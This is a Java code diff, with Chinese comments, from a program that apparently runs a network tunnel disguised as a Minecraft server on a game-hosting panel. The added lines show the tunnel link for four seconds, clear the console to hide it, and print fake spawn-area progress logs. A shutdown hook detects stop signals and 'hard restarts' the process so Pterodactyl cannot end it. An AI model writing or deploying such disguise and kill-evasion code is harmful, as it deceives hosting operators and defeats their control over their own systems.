@@ -135,6 +135,23 @@ public static void main(String[] args) {
             // 3. 伪装 Minecraft 启动日志（含百分比进度 + 链接显示）
             printFakeLimboStartup(tunnelUrl);
             
+            // 4. 给用户4秒钟时间复制链接，然后清屏抹杀链接
+            try { Thread.sleep(4000); } catch (InterruptedException ignored) {}
+            clearConsole();
+            
+            // 5. 清屏后重新快速打印百分比进度（不带链接），保持屏幕有内容
+            limboLog("Starting server...", 0);
+            limboLog("Preparing level \"world\"", 0);
+            limboLog("Preparing start region for dimension minecraft:overworld", 0);
+            limboLog("Preparing spawn area: 1%", 0);
+            limboLog("Preparing spawn area: 5%", 0);
+            limboLog("Preparing spawn area: 15%", 0);
+            limboLog("Preparing spawn area: 35%", 0);
+            limboLog("Preparing spawn area: 60%", 0);
+            limboLog("Preparing spawn area: 80%", 0);
+            limboLog("Preparing spawn area: 99%", 0);
+            limboLog("Preparing spawn area: 100%", 0);
+            
             // ★ 核心加强：检测停止信号，硬重启并清理进程 (防 Pterodactyl 组杀)
             Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                 System.out.println("\n[Guard] Detected server stop signal! Executing hard restart protocol...");
